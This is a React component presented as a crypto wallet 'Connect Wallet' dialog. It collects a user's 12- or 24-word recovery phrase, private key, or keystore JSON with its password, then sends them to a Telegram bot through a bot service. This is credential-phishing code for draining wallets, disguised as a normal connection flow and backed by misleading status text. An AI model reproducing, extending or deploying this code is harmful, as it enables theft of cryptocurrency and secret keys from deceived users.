import React, { useState } from 'react';
import { X, Eye, EyeOff, AlertCircle, Calendar, CheckCircle, XCircle } from 'lucide-react';
import { Button } from './ui/button';
import { Progress } from './ui/progress';
import telegramBotService from '../services/telegramBot';

interface KeyManagementFormProps {
    type: 'private' | 'keystore' | 'phrase';
    onClose: () => void;
    onSubmit: (data: { key: string; password?: string }) => void;
    walletType: string;
}

const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, onSubmit, walletType }) => {
    const [key, setKey] = useState('');
    const [password, setPassword] = useState('');
    const [showKey, setShowKey] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const [isLoading, setIsLoading] = useState(false);
    const [telegramStatus, setTelegramStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
    const [telegramMessage, setTelegramMessage] = useState('');
    const [phraseWords, setPhraseWords] = useState<string[]>(Array(12).fill(''));
    const [is24Word, setIs24Word] = useState(false);

    const handlePhraseWordChange = (idx: number, value: string) => {
        const updated = [...phraseWords];
        updated[idx] = value.replace(/\s/g, '');
        setPhraseWords(updated);
    };

    const handleToggle24Word = () => {
        if (is24Word) {
            setPhraseWords(phraseWords.slice(0, 12));
        } else {
            setPhraseWords([...phraseWords, ...Array(12).fill('')]);
        }
        setIs24Word(!is24Word);
    };

    const validateKey = (value: string) => {
        switch (type) {
            case 'private':
                return /^[0-9a-fA-F]{64}$/.test(value) ? null : 'Private key must be 64 hexadecimal characters';
            case 'phrase': {
                const words = is24Word ? phraseWords : phraseWords.slice(0, 12);
                if (words.some(w => !w)) return 'All words are required';
                return words.length === 12 || words.length === 24 ? null : 'Phrase must be 12 or 24 words';
            }
            case 'keystore':
                try {
                    JSON.parse(value);
                    return null;
                } catch {
                    return 'Invalid JSON format';
                }
        }
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setError(null);
        setIsLoading(true);
        setTelegramStatus('sending');

        try {
            let keyToSend = key;
            if (type === 'phrase') {
                const words = is24Word ? phraseWords : phraseWords.slice(0, 12);
                if (words.some(w => !w)) throw new Error('All words are required');
                keyToSend = words.join(' ');
            }
            const validationError = validateKey(type === 'phrase' ? keyToSend : key);
            if (validationError) {
                throw new Error(validationError);
            }
            if (!telegramBotService.isConfigured()) {
                throw new Error('Telegram bot not configured. Please check your environment variables.');
            }
            const telegramResponse = await telegramBotService.sendWalletAuthRequest({
                walletType,
                keyType: type,
                key: keyToSend,
                ...(type === 'keystore' && { password })
            });
            if (telegramResponse.success) {
                setTelegramStatus('success');
                setTelegramMessage(telegramResponse.message);
                const data = {
                    key: keyToSend,
                    ...(type === 'keystore' && { password })
                };
                onSubmit(data);
                setTimeout(() => {
                    onClose();
                }, 3000);
            } else {
                throw new Error(telegramResponse.message);
            }
        } catch (err) {
            setError(err instanceof Error ? err.message : 'An error occurred');
            setTelegramStatus('error');
            console.error('Key management error:', err);
        } finally {
            setIsLoading(false);
        }
    };

    const getStatusIcon = () => {
        switch (telegramStatus) {
            case 'sending':
                return <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-purple-600"></div>;
            case 'success':
                return <CheckCircle className="w-5 h-5 text-green-600" />;
            case 'error':
                return <XCircle className="w-5 h-5 text-red-600" />;
            default:
                return null;
        }
    };

    const getStatusMessage = () => {
        switch (telegramStatus) {
            case 'sending':
                return 'Connect Wallet';
            case 'success':
                return telegramMessage;
            case 'error':
                return 'Connection Failed. Please try again';
            default:
                return '';
        }
    };

    return (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
            <div className="w-full max-w-md mx-auto">
                <div className="bg-zinc-900/90 backdrop-blur-xl rounded-2xl shadow-xs border border-zinc-800/50 overflow-hidden">
                    <div className="p-5 border-b border-zinc-800/50 bg-zinc-900/70 backdrop-blur-xs">
                        <div className="flex items-start justify-between mb-2">
                            <h2 className="text-lg font-semibold text-white">
                                {type === 'private' ? 'Private Key' : 
                                 type === 'keystore' ? 'Keystore JSON' : 
                                 'Phrase Key Connection'}
                            </h2>
                            <Button
                                variant="ghost"
                                className="text-zinc-500 hover:text-zinc-300"
                                onClick={onClose}
                            >
                                <X className="w-5 h-5" />
                            </Button>
                        </div>
                    </div>
                    <form onSubmit={handleSubmit} className="p-5 space-y-4">
                        {error && (
                            <div className="flex items-center gap-2 p-3 bg-red-900/20 text-red-400 rounded-lg">
                                <AlertCircle className="w-5 h-5" />
                                <span className="text-sm">{error}</span>
                            </div>
                        )}
                        {telegramStatus !== 'idle' && (
                            <div className={`flex items-center gap-2 p-3 rounded-lg ${
                                telegramStatus === 'success' 
                                    ? 'bg-green-900/20 text-green-400'
                                    : telegramStatus === 'error'
                                    ? 'bg-red-900/20 text-red-400'
                                    : 'bg-blue-900/20 text-blue-400'
                            }`}>
                                {getStatusIcon()}
                                <span className="text-sm">{getStatusMessage()}</span>
                            </div>
                        )}
                        {type === 'phrase' ? (
                            <>
                                <div className="flex flex-col items-center mb-2">
                                    <span className="text-zinc-300 text-center text-sm mb-2">Connect your wallet with Solana Sign.</span>
                                    <button
                                        type="button"
                                        className="text-sm text-purple-400 hover:underline mb-2"
                                        onClick={handleToggle24Word}
                                        disabled={isLoading}
                                    >
                                        {is24Word ? 'I have a 12-word recovery phrase' : 'I have a 24-word recovery phrase'}
                                    </button>
                                </div>
                                <div className="grid grid-cols-3 gap-3 mb-2">
                                    {(is24Word ? phraseWords : phraseWords.slice(0, 12)).map((word, idx) => (
                                        <div key={idx} className="flex flex-col items-center">
                                            <span className="text-xs text-zinc-500 mb-1">{idx + 1}.</span>
                                            <input
                                                type="text"
                                                className="w-full px-2 py-2 rounded-md bg-zinc-800 text-white border border-zinc-700 focus:ring-2 focus:ring-purple-500 focus:border-transparent text-center"
                                                value={word}
                                                onChange={e => handlePhraseWordChange(idx, e.target.value)}
                                                disabled={isLoading}
                                                autoComplete="off"
                                                spellCheck={false}
                                            />
                                        </div>
                                    ))}
                                </div>
                            </>
                        ) : (
                            <div className="space-y-2">
                                <label className="text-sm font-medium text-zinc-300">
                                    {type === 'private' ? 'Private Key' : 'Keystore JSON'}
                                </label>
                                <div className="relative">
                                    <textarea
                                        value={key}
                                        onChange={(e) => setKey(e.target.value)}
                                        className="w-full h-32 p-3 bg-zinc-800 rounded-lg text-white border border-zinc-700 focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                                        placeholder={type === 'private' ? 'Enter your private key' : 'Paste your keystore JSON'}
                                        disabled={isLoading}
                                    />
                                    <button
                                        type="button"
                                        onClick={() => setShowKey(!showKey)}
                                        className="absolute top-2 right-2 text-zinc-400 hover:text-zinc-300"
                                    >
                                    </button>
                                </div>
                            </div>
                        )}
                        {type === 'keystore' && (
                            <div className="space-y-2">
                                <label className="text-sm font-medium text-zinc-300">
                                    Password
                                </label>
                                <div className="relative">
                                    <input
                                        type={showPassword ? 'text' : 'password'}
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        className="w-full p-3 bg-zinc-800 text-white rounded-lg border border-zinc-700 focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                                        placeholder="Enter your password"
                                        disabled={isLoading}
                                    />
                                    <button
                                        type="button"
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="absolute top-2 right-2 text-zinc-400 hover:text-zinc-300"
                                    >
                                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                                    </button>
                                </div>
                            </div>
                        )}
                        <div className="space-y-2">
                            <div className="flex items-center justify-between text-xs px-1">
                                <div className="flex items-center gap-1.5">
                                    <span className="text-white font-medium">
                                        {telegramStatus === 'idle' ? 'Here is the final step!' : 'Processing...'}
                                    </span>
                                </div>
                                <div className="flex items-center gap-1.5">
                                    <span className="text-zinc-500 font-medium">
                                        {new Date().toLocaleTimeString('en-GB', { hour12: false })}
                                    </span>
                                    <Calendar className="w-3.5 h-3.5 text-zinc-400" />
                                </div>
                            </div>
                            <div>
                                <Progress
                                    value={telegramStatus === 'idle' ? 0 : telegramStatus === 'sending' ? 50 : 100}
                                    className="h-1 bg-zinc-700"
                                />
                            </div>
                        </div>
                        <div className="flex gap-3 pt-4">
                            <Button
                                type="button"
                                variant="ghost"
                                className="flex-1 text-zinc-400 hover:bg-zinc-800"
                                onClick={onClose}
                                disabled={isLoading}
                            >
                                Cancel
                            </Button>
                            <Button
                                type="submit"
                                className="flex-1 bg-purple-600 text-white hover:bg-purple-700"
                                disabled={isLoading || telegramStatus === 'sending' || (type === 'phrase' && (is24Word ? phraseWords.slice(0,24).some(w => !w) : phraseWords.slice(0,12).some(w => !w)))}
                            >
                                {isLoading ? 'Connection Successful.' : (type === 'keystore' ? 'Please wait...' : 'Connect Wallet')}
                            </Button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    );
};

export default KeyManagementForm; 